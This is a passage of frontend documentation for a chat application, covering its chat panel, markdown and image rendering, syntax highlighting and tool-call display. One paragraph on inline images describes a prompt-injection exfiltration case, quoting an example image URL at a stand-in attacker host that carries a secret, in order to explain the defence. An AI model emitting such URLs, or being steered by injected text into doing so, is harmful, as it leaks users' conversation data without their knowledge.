`HomeComposer` therefore passes `skipSendLocks`, and locking for home-originated conversations happens on the real conversation id in `ChatPanel`'s `pendingFirstMessage` effect.

To heal browsers poisoned by older builds, `ConversationModelsContext.tsx`'s lazy initializer for `lockedProviders` strips any `HOME_DRAFT_KEY` entry on load; the localStorage blob is deliberately left stale and gets re-serialized on the next lock write. This is why `HOME_DRAFT_KEY` must stay byte-identical to the historical `'__home_draft__'` string.

**Custom Scrollbars**:
```css
.messages-container::-webkit-scrollbar {
  width: 8px;
}
.messages-container::-webkit-scrollbar-thumb {
  background: rgba(255, 255, 255, 0.2);
  border-radius: 4px;
}
```

**Animations**:
- Fade-in on message appearance
- Pulse animation during streaming
- Typing indicator bouncing dots
- Smooth transitions on all interactive elements

**Light Mode Support**:
Uses `@media (prefers-color-scheme: light)` to adapt:
- White background (#ffffff)
- Light gray message bubbles (#f5f5f5)
- Dark text colors
- Inverted scrollbar colors
- Adjusted error colors (#d32f2f)

#### 3. App Integration (`src/App.tsx`)

The main App component now displays ChatPanel when a conversation is selected:

**Layout Structure**:
```
app-container
├── Sidebar (260px fixed width)
│   ├── Brand bar (logo + name, search icon, requests inbox icon with badge)
│   ├── Projects section (always visible)
│   └── Conversations list with inline "New Chat" button
└── main-content (flex-grow)
    ├── ChatPanel (if conversationId selected)
    └── HomeComposer (if no conversation)
```

**Main content rendering** (see `frontend/src/App.tsx`): When `activeConversationId` is set, renders `ChatPanel` with the conversation. When no conversation is selected, renders `<HomeComposer>` (the root home screen, see the Composer / Home Screen section), wired to the same `handleNewConversation` callback the Sidebar "New Chat" button uses.

**Callback Handlers**:
- `handleConversationSelect(id)`: Sets active conversation from sidebar
- `handleNewConversation(id)`: Sets active conversation after creation
- `handleConversationUpdate()`: Refreshes sidebar when messages sent

#### 4. Backend WebSocket (`chat/realtime/socket.py`)

Chat traffic rides on the persistent multiplexed WebSocket (`WS /app/api/stream`). See [Realtime Architecture](realtime.md) for the endpoint structure (reader / writer / heartbeat coroutines, send registry, transient-event mirroring) and [Chat API -- WebSocket Endpoint](../api/chat-api.md#websocket-endpoint) for the wire protocol.

### Component Architecture

```
ChatPanel
    ├── Conversation History Loading
    │   └── fetchConversation() → REST API
    │
    ├── Message Display
    │   ├── Message list rendering
    │   ├── User/assistant role styling
    │   ├── Timestamp formatting
    │   └── Empty/loading/error states
    │
    ├── Real-time Streaming
    │   ├── useConversation hook → persistentWebSocket subscription
    │   ├── Partial response display (text deltas bundled by WebSocketManager)
    │   ├── Typing indicator
    │   └── Stream error handling
    │
    ├── Auto-scroll Management
    │   ├── Scroll position tracking
    │   ├── Near-bottom detection
    │   ├── Smart auto-scroll
    │   ├── User scroll preservation
    │   └── Search result scroll-to-message (via scrollToMessageIndex)
    │
    ├── Message Input
    │   ├── Auto-resizing textarea
    │   ├── Enter/Shift+Enter handling
    │   ├── Optimistic UI updates
    │   └── Disabled during streaming
    │
    ├── Model Selector
    │   ├── Dropdown with Pro/Flash options
    │   ├── Per-conversation localStorage persistence
    │   └── Default propagation to new conversations
    │
    └── Parent Communication
        └── onConversationUpdate callback
```

### Data Flow: Sending a Message

```
1. User types in textarea and presses Enter
        ↓
2. handleSendMessage() called
        ↓
3. Optimistic UI update: User message added (optimistic: true) to messages array
        ↓
4. Input cleared and textarea reset
        ↓
5. Auto-scroll to bottom (smooth)
        ↓
6. sendMessage(text) called from useConversation
        ↓
7. WebSocketManager.sendMessage forwards to persistentWebSocket.send({op:"send_message", ...})
        ↓
8. Backend (chat/realtime/socket.py:_handle_send_message) appends user message to chat_history.json
   → publishes message_appended → useConversation REST-fetches the new tail and reconciles
        ↓
9. _run_send_message launches run_conversation_turn(); make_flush_callback writes durable events to disk
   and publishes message_appended on each flush boundary
        ↓
10. Transient text_delta / sub_agent_* / tool_started events stream on the conversation channel
        ↓
11. WebSocketManager bundles text_delta into partialResponse; useConversation re-renders
        ↓
12. Auto-scroll if user was near bottom
        ↓
13. send_message_finished envelope → notifyStreamComplete; Sidebar refreshes via
    conversation_list_changed (or onStreamComplete callback)
```

### Auto-Scroll Behavior

The ChatPanel implements intelligent auto-scroll:

**Near-Bottom Detection**:
```typescript
function isNearBottom(container: HTMLElement, threshold: number = 100): boolean {
  const { scrollTop, scrollHeight, clientHeight } = container;
  return scrollHeight - scrollTop - clientHeight < threshold;
}
```

**Scroll Position Tracking**:
- Tracks `wasNearBottom` state on scroll events
- Captured before streaming starts
- Used to decide whether to auto-scroll during streaming

**Auto-Scroll Rules**:
1. **On conversation load**: Always scroll to bottom (instant)
2. **On user sends message**: Always scroll to bottom (smooth)
3. **During streaming**: Only if user was near bottom
4. **On stream complete**: Only if user was near bottom
5. **User scrolls up**: Stop auto-scrolling until user returns to bottom

This prevents interrupting users who are reading message history while new messages arrive.

### Input Handling

**Auto-Resize Textarea**:
The textarea auto-resizes up to 200px height as the user types. See `handleInputChange` in `frontend/src/components/ChatPanel.tsx`.

**Keyboard Shortcuts**:
- **Enter**: Send message (guarded by `!e.nativeEvent.isComposing` to prevent IME composition confirmation from triggering send — see `handleKeyDown` in `frontend/src/components/ChatPanel.tsx`)
- **Shift+Enter**: Insert newline
- **Disabled during streaming**: Prevents multiple sends

**Auto-Focus After Streaming**:
When streaming transitions from active to complete, the input textarea is automatically focused via `inputRef.current?.focus()` in a streaming-transition `useEffect`. This lets users start typing their next message immediately without clicking the input.

**Button States**:
- Disabled if input is empty
- Disabled during streaming
- Shows "Sending..." text while streaming

### Error Handling

**Loading Errors**:
If conversation fails to load, shows error state via the `.chat-error` element in `frontend/src/components/ChatPanel.tsx`.

**Streaming Errors**:
If message streaming fails, shows error banner via the `.stream-error` element in `frontend/src/components/ChatPanel.tsx`.

**Error Recovery**:
- User can continue typing after stream error
- Next message attempt creates new WebSocket connection
- Old connections properly cleaned up

### Integration with useConversation Hook

The ChatPanel uses the `useConversation` hook for state management and messaging:

**Hook Usage**:
```typescript
const {
  messages,           // Loaded messages from conversationStore
  isStreaming,        // Whether currently streaming
  partialResponse,    // Accumulated text during streaming
  streamingMessages,  // Structured messages (tool_use, tool_result, stats)
  error,              // Error message (if any)
  isLoaded,           // Whether conversation loaded from API
  isLoading,          // Whether currently loading
  sendMessage,        // Function to send messages via WebSocketManager
} = useConversation(conversationId);
```

**Hook Features**:
- Subscribes to `conversationStore` via `useSyncExternalStore`
- Automatic conversation loading from API on mount
- Delegates WebSocket management to `WebSocketManager` singleton
- State persists across component unmounts (survives conversation switching)
- Re-renders only when subscribed conversation's state changes

### Styling Patterns

**Component-Specific Classes**:
```css
.chat-panel           /* Container */
.messages-container   /* Scrollable area */
.messages-list        /* Message array */
.message              /* Individual message */
.message.user         /* User message modifier */
.message.assistant    /* Quest (assistant) message modifier */
.message-footer       /* Hover-only timestamp (+ model) under the bubble */
.message-content      /* Message bubble */
.input-area           /* Bottom input section */
.message-input        /* Textarea */
.send-button          /* Send button */
```

**State Modifiers**:
```css
.message.streaming    /* Streaming animation */
.message-input:disabled  /* Disabled state */
.send-button:disabled    /* Disabled state */
```

**Utility Classes**:
```css
.chat-loading         /* Loading state */
.chat-error           /* Error state */
.stream-error         /* Stream error banner */
.empty-conversation   /* Empty state */
```

## Message Component with Markdown Rendering

The Message component provides rich markdown rendering capabilities, replacing the inline message display in ChatPanel.

### Implemented Components

#### 1. Message Component (`src/components/Message.tsx`)

A reusable component for rendering individual chat messages with markdown support. The `MessageContentRenderer` sub-component is wrapped with `React.memo` to prevent re-renders of already-displayed messages when the parent list re-renders.

**Props**: `role` (user/assistant), `content` (message text), `timestamp` (ISO string). See `MessageProps` interface in `frontend/src/components/Message.tsx`.

**Features**:
- Role-based styling (user vs Quest messages)
- "Quest" label on assistant messages with a model tooltip (hovering shows the specific model display name, resolved via `getModelDisplayName()` from `frontend/src/constants/models.ts` using the `model` field from stats)
- Markdown rendering for Quest messages using `react-markdown`
- Plain text rendering for user messages
- Timestamp formatting via shared `formatTimestamp` utility from `frontend/src/utils/formatters.ts`
- Token count formatting via `formatNumber` utility from `frontend/src/utils/formatters.ts` (locale-aware thousand separators)
- Unified token display with provider-aware hover tooltips for cache breakdown (see `frontend/src/components/Message.css` for `.stats-tooltip-container` and `.stats-tooltip` styles)
- GitHub Flavored Markdown (GFM) support via `remark-gfm`
- Consistent newline rendering via `remark-breaks` (single `\n` becomes `<br>`)
- Automatic syntax highlighting for code blocks via `rehype-highlight`
- LaTeX math rendering (`$\rightarrow$` inline, `$$...$$` display) via `remark-math` + `rehype-katex`, with the `remarkMathCurrencyGuard` plugin (`frontend/src/utils/remarkMathCurrencyGuard.ts`) reverting currency-looking spans such as "$5 and $10" back to text
- Dark/light mode support with custom syntax highlighting colors
- Links in Quest messages open in new browser tabs via the shared `markdownComponents` anchor renderer (`target="_blank"`, `rel="noopener noreferrer"`)
- Tables in Quest messages display a hover copy button via the `CopyableTable` component (copies as TSV and HTML)

**Markdown Rendering**:
- **User messages**: Plain text with `white-space: pre-wrap` to preserve formatting
- **Quest messages**: Full markdown rendering with `remark-gfm` (tables, task lists, strikethrough, autolinks), `remark-breaks` (single newlines rendered as `<br>`), `rehype-highlight` (syntax highlighting via highlight.js), and `remark-math` + `rehype-katex` (KaTeX math for `$...$` / `$$...$$`, followed by `remarkMathCurrencyGuard` so plain dollar amounts stay text -- the guard applies Pandoc's rule: whitespace just inside either delimiter or a digit right after the closing `$` means "not math").
  - The same plugin stack is used by the streaming partial-response renderer in ChatPanel and the `.md` preview in FileViewerModal. Custom element renderers are defined in the shared `markdownComponents` object (see below)

**Table Copy Hover Widget**:
The `CopyableTable` component in `frontend/src/components/Message.tsx` wraps each rendered `<table>` in a `div.table-copy-wrapper` with an absolutely-positioned copy button. When the user hovers over a table, a copy icon appears in the top-right corner.

Clicking it copies the table to the clipboard in two formats simultaneously via `navigator.clipboard.write()` with `ClipboardItem`: `text/plain` (tab-separated values for spreadsheets) and `text/html` (the table's `outerHTML` for rich-text apps). TSV extraction walks the table DOM (`tr` > `th`/`td`), escaping tabs and newlines in cell text.

After a successful copy the button shows a green checkmark for 2 seconds. Styling is in `frontend/src/components/Message.css` (`.table-copy-wrapper`, `.table-copy-btn`) with dark and light mode variants.

**Shared `markdownComponents`**:
The `markdownComponents` object is exported from `frontend/src/components/Message.tsx` and provides custom ReactMarkdown `components` overrides shared by both the Message component (persisted messages) and ChatPanel (streaming messages). It includes a custom `a` renderer (opens links in new tabs with `target="_blank"`, `rel="noopener noreferrer"`), a custom `table` renderer (wraps tables in `CopyableTable` for the hover-copy widget), and a custom `img` renderer (`MarkdownImage`) for inline workspace images (see below)

**Inline workspace markdown images (`MarkdownImage` + `MarkdownWorkspaceContext`)**:
The model can embed a workspace image directly in its reply with plain markdown -- `![Revenue by quarter](chart.png)` -- and the chat renders it inline. The `img` override in `markdownComponents` (`MarkdownImage` in `frontend/src/components/Message.tsx`) **never auto-fetches external images**: an `<img>` fires its request on render, so a prompt-injected reply embedding `https://attacker.example/p.png?<secret>` would exfiltrate conversation data with zero user interaction.

Absolute srcs (any scheme -- `http(s):`, `data:`, `blob:` -- or protocol-relative `//`) therefore degrade to a plain click-through `<a target="_blank">` link (the same user-initiated exposure ordinary markdown links already have).

Only workspace-relative srcs render as images: percent-decode, strip leading `./`, `/`, and `workspace/`, then point the `<img>` at `GET /app/api/conversations/{id}/files/download?path=...` (cookie auth; the endpoint transparently serves the project workspace for project conversations, so no project id is needed).

The conversation id and a click-to-enlarge callback arrive via `MarkdownWorkspaceContext` -- a context rather than a components-factory so `markdownComponents` stays a stable module constant and the `React.memo` on `MessageContentRenderer` keeps holding. `ChatPanel` provides the context (memoized) around its message list; clicking an image opens the existing `FileViewerModal` (the viewer state is a plain `{workspace_path, filename}` shared with composer-attachment thumbnails).

`FileViewerModal` also provides the context (id only, no click handler) around its `.md` preview so markdown files referencing workspace images render them.

The Quest Docs viewer provides the context with `assetBase` (`docAssetBase(docId)` from `frontend/src/api/docsApi.ts`) instead of a conversation id. With `assetBase` set, only an `assets/<name>` src resolves (one segment, no leading dot, after the same decode/normalize) to `<assetBase>/<name>`, the doc's cookie-authed asset route; every other relative src is a missing ref, `conversationId` is ignored, and external srcs still degrade to links. See [Quest Docs -- Viewer](quest-docs.md#viewer).

A src that fails to load (or renders with no conversation id) falls back to an italic `<code class="markdown-image-missing">` chip showing the alt text/path; the failure is tracked per-URL so a truncated src during streaming recovers once the full destination arrives. Note the renderer stack has no `rehype-raw`, so only markdown `![...](...)` syntax renders -- raw `<img>` HTML in model output is dropped.

The system prompt and the `system:workspace` skill teach the model the workspace-root-relative path convention (PNG/JPEG/GIF/WebP only; see [File Browser API](../api/file-browser-api.md) for the inline MIME allow-list)

#### 2. Message Styling (`src/components/Message.css`)

Comprehensive CSS with markdown element styling and syntax highlighting:

**Layout**:
- Flexbox column layout with gap spacing
- User messages: right-aligned (flex-end)
- Quest messages: left-aligned (flex-start)
- Fade-in animation on message appearance

**Message Bubbles**:
- User messages: Blue background (#646cff)
- Quest messages: Dark gray background (#2a2a2a)
- Max-width: 80% for readability
- Rounded corners (12px border-radius)
- Word wrapping and pre-wrap whitespace

**Markdown Element Styles**:
- **Headings**: Font-size hierarchy (h1-h6), top/bottom margins
- **Paragraphs**: Vertical spacing with margin collapse
- **Links**: Blue color (#58a6ff) with dotted underline, solid on hover; all links open in new tabs via custom anchor renderer
- **Code blocks**: Dark blue-tinted background (#1a1b2e), `var(--font-mono)` font, subtle border, explicit base text color (#e4e4e8, ~13:1 contrast ratio), overflow-x auto
- **Inline code**: Dark mode gets lavender tint (#e8d4f8); light mode gets dark purple tint (#3b2e58 on #f4f5f9). Uses `var(--font-mono)`, smaller padding, rounded corners
- **Lists**: Proper indentation and spacing, nested list support
- **Blockquotes**: Left border accent, increased padding, dimmed text
- **Tables**: Full-width, bordered cells, striped rows, header styling. Each table is wrapped by `CopyableTable` in a `.table-copy-wrapper` div with a `.table-copy-btn` overlay (see Table Copy Hover Widget above)
- **Horizontal rules**: Subtle border separator
- **Images**: Max-width 100%, auto height, rounded corners
- **Task lists**: Checkbox support for GFM task lists

**Syntax Highlighting**:
Custom color scheme for code blocks (overrides highlight.js theme):

**Dark Mode Colors**:
- Keywords: Bright pink (#ff79c6) with bold weight
- Function keywords: Bright purple (#e66aff) with bold weight
- Strings: Bright green (#50fa7b)
- Numbers/Built-ins: Bright orange (#ffb86c)
- Types/Titles: Bright yellow (#f1fa8c) with bold weight
- Comments: Muted blue-gray (#8b95b5, ~5.5:1 contrast ratio on #1a1b2e) with italic style
- Variables: Bright orange (#ffb86c)
- Names: Cyan (#8be9fd)
- Parameters: Almost white (#f8f8f2)

**Light Mode Colors**:
- Keywords: Red (#d73a49) with bold weight
- Function keywords: Purple (#6f42c1) with bold weight
- Strings: Dark green (#22863a)
- Numbers/Built-ins: Blue (#005cc5)
- Types/Titles: Purple (#6f42c1) with bold weight
- Comments: Dark gray (#57606a, ~5.8:1 contrast ratio on #f4f5f9) with italic style
- Variables: Orange (#e36209)
- Names: Blue (#005cc5)
- Parameters: Dark gray (#24292e)

**Light Mode Support**:
Uses `@media (prefers-color-scheme: light)` to adapt:
- Light gray message bubbles (#f5f5f5)
- Dark text colors
- Adjusted markdown element colors
- Blue-tinted code block background (#f4f5f9) with explicit base text color (#24292f)
- Inline code with dark purple tint (#3b2e58) for visual distinction from prose
- GitHub-style link colors (#0969da)

#### 3. Shared Formatters Utility (`src/utils/formatters.ts`)

Utility functions for formatting data across the application:

**Functions**:
- `formatTimestamp(timestamp: string): string` - Formats a timestamp for display
- `parseUTCTimestamp(timestamp: string): Date` - Parses UTC timestamps with backwards compatibility
- `formatNumber(n: number): string` - Formats a number with locale-aware thousand separators via `toLocaleString()` (e.g., `12345` becomes `"12,345"`). Used by the Message component to format all token count values in the stats bar

**Timestamp Formatting Logic** (`formatTimestamp`):
- **Today**: Show time only ("2:30 PM")
- **Other days**: Show date + time ("Jan 30, 2:30 PM")

**UTC Timestamp Parsing** (`parseUTCTimestamp`):
- Handles timestamps with explicit "Z" suffix (e.g., `2026-01-31T10:30:00.000000Z`)
- Handles legacy timestamps without "Z" suffix (backwards compatible)
- Returns a JavaScript `Date` object for use with formatting functions

This centralizes timestamp and number formatting logic, making it reusable across components.

**Consumers**: `formatTimestamp` is used in `frontend/src/components/Message.tsx` and `frontend/src/components/Sidebar.tsx`. `parseUTCTimestamp` is used in `frontend/src/components/Sidebar.tsx` for relative time calculations. `formatNumber` is used in `frontend/src/components/Message.tsx` for token count display.

#### 4. ChatPanel Integration

The ChatPanel component was updated to use the Message component:

**Changes**:
- Removed inline message rendering
- Imported and used `Message` component for rendering messages
- Moved `formatTimestamp` to shared utility
- Streaming messages still use inline rendering (for performance)
- Cleaner component code with separation of concerns

See `frontend/src/components/ChatPanel.tsx` for the message rendering implementation using the `Message` component.

### Dependencies

The Message component's markdown-related dependencies are declared in `frontend/package.json`:

- **react-markdown**: Core markdown rendering component, converts markdown to React elements
- **remark-gfm**: GitHub Flavored Markdown extensions (tables, task lists, strikethrough, autolinks)
- **remark-breaks**: Converts single newlines to `<br>` elements (CommonMark treats single `\n` as soft breaks that collapse under `white-space: normal`; this plugin makes newlines render consistently regardless of CSS)
- **rehype-highlight**: Integrates highlight.js for automatic code syntax highlighting
- **remark-math** / **rehype-katex** / **katex**: Parse `$...$` and `$$...$$` and render them with KaTeX. `katex/dist/katex.min.css` is imported once in `Message.tsx`; Vite bundles the referenced KaTeX fonts into `dist/assets/`, so the no-egress deployment serves them itself via the `/assets` mount
- **highlight.js**: Language detection and syntax highlighting for 190+ languages

### Markdown Rendering Architecture

```
Message Component / ChatPanel (streaming)
    ├── User Messages
    │   └── Plain text rendering (pre-wrap whitespace)
    │
    └── Quest Messages
        └── ReactMarkdown (with shared markdownComponents)
            ├── remark-gfm (GFM plugin)
            │   ├── Tables → CopyableTable (hover copy widget)
            │   ├── Task lists
            │   ├── Strikethrough
            │   └── Autolinks
            │
            ├── remark-breaks (newline → <br>)
            │
            ├── rehype-highlight (syntax highlighting)
            │   ├── highlight.js language detection
            │   ├── Custom dark mode colors
            │   └── Custom light mode colors
            │
            └── markdownComponents (shared from Message.tsx)
                ├── a → new-tab links (target="_blank")
                └── table → CopyableTable (TSV + HTML clipboard copy)
```

### Supported Markdown Features

The Message component supports the full GitHub Flavored Markdown specification:

**Text Formatting**:
- **Bold**: `**text**` or `__text__`
- *Italic*: `*text*` or `_text_`
- ~~Strikethrough~~: `~~text~~` (GFM)
- Inline code: `` `code` ``

**Headings**:
```markdown
# H1
## H2
### H3
#### H4
##### H5
###### H6
```

**Lists**:
- Unordered lists with `*`, `-`, or `+`
- Ordered lists with `1.`, `2.`, etc.
- Nested lists with indentation
- Task lists: `- [ ]` and `- [x]` (GFM)

**Links and Images**:
- Links: `[text](url)`
- Images: `![alt](url)`
- Autolinks: `https://example.com` (GFM)

**Code Blocks**:
````markdown
```language
code here
```
````

Supported languages include: javascript, typescript, python, java, c, cpp, rust, go, ruby, php, html, css, sql, bash, and 180+ more.

**Blockquotes**:
```markdown
> Quote text
> Multiple lines
```

**Tables** (GFM):
```markdown
| Header 1 | Header 2 |
|----------|----------|
| Cell 1   | Cell 2   |
```

**Horizontal Rules**:
```markdown
---
***
___
```

### Syntax Highlighting Implementation

The component uses highlight.js with custom color schemes for both light and dark modes. The base theme (`atom-one-dark.css`) is imported and then overridden with custom colors in `frontend/src/components/Message.css`.

**Features**:
- Automatic language detection
- 190+ language support
- Custom color schemes with all colors passing WCAG AA (4.5:1 minimum contrast ratio)
- Dark mode uses #1a1b2e background with #e4e4e8 base text; light mode uses #f4f5f9 background with #24292f base text
- Font weight variations for emphasis
- Italic styling for comments
- `var(--font-mono)` (JetBrains Mono stack) applied explicitly to code blocks

**Supported Languages** (partial list):
- **Web**: JavaScript, TypeScript, HTML, CSS, JSX, TSX
- **Backend**: Python, Java, Go, Rust, C, C++, C#, PHP, Ruby
- **Data**: SQL, JSON, YAML, TOML, XML
- **Scripting**: Bash, Shell, PowerShell
- **Markup**: Markdown, LaTeX
- **And 180+ more...**

### Component Design Patterns

#### 1. Conditional Rendering by Role

Different rendering paths for user vs assistant messages:
```typescript
{role === 'user' ? (
  content  // Plain text
) : (
  <ReactMarkdown ...>{content}</ReactMarkdown>  // Markdown
)}
```

**Rationale**: User messages typically don't contain markdown (just plain text input), so we avoid unnecessary markdown parsing overhead.

#### 2. Plugin Configuration

Markdown plugins configured as arrays in `frontend/src/components/Message.tsx` and `frontend/src/components/ChatPanel.tsx`:
- **remarkPlugins**: `[remarkGfm, remarkBreaks]`
- **rehypePlugins**: `[rehypeHighlight]`

Both the Message component (final rendered messages) and the ChatPanel streaming render use the same plugin configuration and the shared `markdownComponents` object (exported from `Message.tsx`, imported by `ChatPanel.tsx`) for consistent output, including the table copy hover widget and new-tab link behavior.

**Why `remark-breaks`?**
CommonMark treats single `\n` as a soft break (not a `<br>`), so newline visibility depends on CSS `white-space`. During streaming, `white-space: pre-wrap` preserved newlines visually, but after streaming completed, `white-space: normal` collapsed them -- causing visible line breaks to disappear. The `remark-breaks` plugin converts single newlines to `<br>` elements in the markdown AST, making newlines render consistently regardless of CSS white-space settings.

#### 3. Shared Utilities

The `formatTimestamp` utility is shared across components:
- Used by Message component
- Can be used by other components (Sidebar, etc.)
- Single source of truth for timestamp formatting
- Easy to modify formatting logic in one place

#### 4. CSS Scoping

Component-specific CSS with hierarchical selectors:
```css
.message { /* Base styles */ }
.message.user { /* User modifier */ }
.message.assistant { /* Quest (assistant) modifier */ }
.message-content code { /* Nested elements */ }
```

This prevents style leakage between components while keeping specificity manageable.

### Performance Considerations

**Markdown Parsing**:
- Conditionally rendered (only for assistant messages)
- react-markdown is optimized for performance
- No parsing overhead for user messages

**Syntax Highlighting**:
- highlight.js uses efficient language detection
- Only runs on code blocks, not entire message
- Cached results within the component lifecycle

**Component Re-rendering**:
- Pure component (re-renders only when props change)
- Message content is stable (immutable)
- No unnecessary re-renders from parent state changes

### Accessibility

The Message component follows accessibility best practices:

**Semantic HTML**:
- ReactMarkdown generates semantic HTML elements
- Proper heading hierarchy (h1-h6)
- Lists use `<ul>`, `<ol>`, `<li>` elements
- Code blocks use `<pre>` and `<code>` elements

**Contrast Ratios**:
- All syntax highlighting colors pass WCAG AA (4.5:1 minimum contrast ratio)
- Dark mode: comment color #8b95b5 at ~5.5:1 on #1a1b2e; base text #e4e4e8 at ~13:1
- Light mode: comment color #57606a at ~5.8:1 on #f4f5f9; base text #24292f
- Different colors in light/dark mode for optimal contrast

**Keyboard Navigation**:
- Links are keyboard accessible
- Task list checkboxes are focusable (though read-only)

### Testing Considerations

The Message component is designed for testability:

**Unit Tests**:
```typescript
// Test role-based rendering
expect(render(<Message role="user" ... />)).toContainText('You')
expect(render(<Message role="assistant" ... />)).toContainText('Quest')

// Test markdown rendering
expect(render(<Message role="assistant" content="**bold**" ... />))
  .toContain('<strong>bold</strong>')

// Test timestamp formatting
expect(render(<Message timestamp="..." ... />))
  .toContainText(formatTimestamp('...'))
```

**Integration Tests**:
- Test with real markdown content
- Verify syntax highlighting applies
- Check dark/light mode styles
- Validate GFM features (tables, task lists)

## Tool Use Message Display

The tool use display renders Gemini tool invocations in the chat interface, allowing users to see when Gemini uses tools and inspect the tool inputs and outputs.

### Overview

When the LLM uses tools during response generation (e.g., reading files, making API calls), these tool invocations are now:
1. Captured by the backend from the Gemini CLI stream
2. Forwarded to the frontend as structured messages
3. Displayed in collapsible UI components
4. Saved to chat history for persistence

### Implemented Components

#### 1. ToolUseMessage Component (`src/components/ToolUseMessage.tsx`)

A collapsible component for displaying tool invocations:

**Props**: Accepts `toolUse` (a `ToolUseMessageType` from `frontend/src/api/types.ts`, which includes `intent_message`), an optional `toolResult` (`ToolResultMessageType`), an optional `childToolCalls` (array of `SubAgentToolCallInfo` for sub-agent tool call tree rendering), and an optional `subAgentReturned` (`Map<agentName, SubAgentFinishedInfo>` of per-agent terminal states, present only on `agent_task` / `agent_task_parallel` / `agent_task_parallel_template` rows). See `frontend/src/components/ToolUseMessage.tsx` for the props interface.

**Features**:
- **Description-first display**: When the model provides an `intent_message`, it is shown as the primary label (the `displayName`) in a proportional sans-serif font via the `tool-name-description` CSS class. The raw tool name is demoted to the secondary label (the `displayIntent`), displayed in reduced-opacity text. When no `intent_message` is available, the tool name is shown as the primary label in the default monospace font with no secondary label. This makes the collapsed tool message line read as a human-friendly description (e.g., "Fetch unread emails") rather than a raw identifier (e.g., "curl_proxy_get").
- **Special `agent_task` rendering**: When `toolUse.tool_name === 'agent_task'`, the component derives display values from `tool_input` instead of the standard fields:
  - `displayName` is set to `toolUse.tool_input.name` (the sub-agent's name, e.g. "Email Researcher") instead of the raw tool name `agent_task`
  - `displayIntent` is set to `toolUse.tool_input.description` (the sub-agent's task description) instead of `intent_message`
  - The tool icon switches from a wrench SVG to a person SVG (person silhouette with head and shoulders), signaling that this is a delegated agent task rather than a mechanical tool call
  - The `isAgentTask` boolean in `frontend/src/components/ToolUseMessage.tsx` controls this branching
- **Special `agent_task_parallel` / `agent_task_parallel_template` rendering**: When `toolUse.tool_name === 'agent_task_parallel'`, the component derives display values from the `tasks` array in `tool_input`; when `toolUse.tool_name === 'agent_task_parallel_template'`, it reads the `agents` array instead. Both produce the same header shape:
  - `displayName` is set to "{N} parallel sub-agent(s)" based on the task / agent count (e.g., "3 parallel sub-agents")
  - `displayIntent` is set to the sub-agent names joined by commas (e.g., "Email Researcher, Calendar Checker")
  - Uses the same person icon as `agent_task`
  - `isAgentTask`, `isAgentTaskParallel`, and `isAgentTaskParallelTemplate` are tracked separately; the derived `isAnyParallel` covers both parallel variants for grouped-children rendering, and `isSubAgent` covers all three for shared icon/styling logic
- **Sub-agent tool call tree**: When `childToolCalls` is provided and non-empty, sub-agent tool calls are rendered as an expandable tree below the parent tool call.
  - For `agent_task` (single sub-agent), tool calls are listed directly. For both `agent_task_parallel` and `agent_task_parallel_template` (the `isAnyParallel` branch), tool calls are grouped by `agentName` into expandable `SubAgentSection` entries, each showing its own `RUNNING` / `COMPLETED` / `ERRORED` status badge. For the template variant the expected-agent list is resolved from `tool_input.agents[].name`.
  - Individual tool calls are rendered by `SubAgentToolCallEntry`, which shows the tool name and intent message in collapsed state, and expands to show full input parameters and output. The tree is visible in both the collapsed and expanded states of the parent tool call
- **Nested (2nd-level) agent nodes**: A 1st-level agent's child tool calls are partitioned (helper in `frontend/src/components/ToolUseMessage.tsx`) into plain leaf calls, nested-agent NODE calls (the `agent_task_nested` invocations, identified by `nested_agent_id`), and grandchild calls (identified by `nested_parent_id`, grouped under their node).
  - Each node renders as a `NestedAgentNode`: a child agent row (name + model + status badge, indented one level under the 1st-level agent) that expands to its prompt, response, and the grandchild's own tool calls indented one extra level.
  - The node's terminal badge comes from the NODE `sub_agent_tool_result`'s `nested_agent_status`, with the grandchild's `sub_agent_finished` (keyed by `nested_agent_id` in `subAgentReturned`) as a reload fallback.
  - Only present in `nested_subagents` conversations (see [Conversation Flags](conversation-flags.md), [Realtime -- Nested Sub-Agent Events](realtime.md#nested-2nd-level-sub-agent-events)). Styling is in `frontend/src/components/ToolUseMessage.css` (`.nested-agent-node`, `.nested-agent-model`, `.nested-agent-detail`)
- **Sub-agent status semantics**: For `agent_task` / `agent_task_parallel` / `agent_task_parallel_template` rows, the per-row `SubAgentSection` badge and the outer "N parallel sub-agents" group badge are driven by `subAgentReturned` entries (populated from `sub_agent_finished` events), not by the presence of the last inner `tool_result`.
  - The outer group resolves its expected-agent list from the parent's `tool_input.name` / `tasks` / `agents` so it stays `RUNNING` until *every* expected sub-agent has emitted a `sub_agent_finished` event; if any emitted `status="error"`, the badge shows `ERRORED` (with the error string as the hover tooltip).
  - The `ToolUseMessage` component also synthesizes a success-only map for conversations persisted before `sub_agent_finished` existed -- when `subAgentReturned` is empty but the parent `tool_result` is present, the row is treated as `COMPLETED`. Non-sub-agent tool rows still use the simple "has `toolResult` -> completed" rule
- Status indicator: "running..." (animated pulse), "completed" (green), or "errored" (red, sub-agent rows only)
- Expandable/collapsible design with chevron toggle
- **Collapsed state**: Compact single-line appearance with improved contrast
  - 85% opacity (hover: 100%) for readable but unobtrusive tool messages
  - Boosted alpha values on text, icons, status badges, and chevrons for better legibility
  - 16x16px icon, 0.75rem font size
  - No background or border (transparent)
  - Timestamp hidden (only shown when expanded)
  - No preview section -- just description (or tool name/sub-agent name), secondary label (or description), and status
  - Human-readable descriptions use proportional sans-serif font; raw tool names use monospace font
- **Expanded state**: Full detailed view
  - Timestamp display
  - Input section showing JSON-formatted tool parameters
  - Output section showing tool result (when available)
  - Improved tool-intent contrast for better readability
- Smooth animations for expand/collapse and status changes
- Full dark/light mode support with contrast improvements in both modes

**Component Structure**: See `frontend/src/components/ToolUseMessage.tsx` for the full implementation. Key sections include:
- Header with tool icon (wrench for regular tools, person for `agent_task` / `agent_task_parallel` / `agent_task_parallel_template`), primary label (description when available, tool name otherwise), secondary label (tool name when description is primary, empty otherwise), status badge, and toggle chevron
- Sub-agent tool call tree (rendered below header when `childToolCalls` is present, via `SubAgentToolCallEntry` and `SubAgentSection` sub-components)
- Timestamp (conditionally rendered only when expanded)
- Details section with Input/Output (conditionally rendered only when expanded)

#### 2. ToolUseMessage Styling (`src/components/ToolUseMessage.css`)

Comprehensive CSS with animations, collapsed/expanded states, and dark/light mode support.

**Collapsed State** (default):
- Compact single-line appearance with improved contrast
- 85% opacity with hover transition to 100% (increased from previous 50%/80% for better legibility)
- Transparent background, no border
- Compact sizing: 16x16px icon, 0.75rem font
- Reduced padding (0.25rem)
- Status badges have transparent background with boosted alpha on text colors
- Boosted alpha on icon colors, tool name, tool intent, and chevrons in both dark and light modes
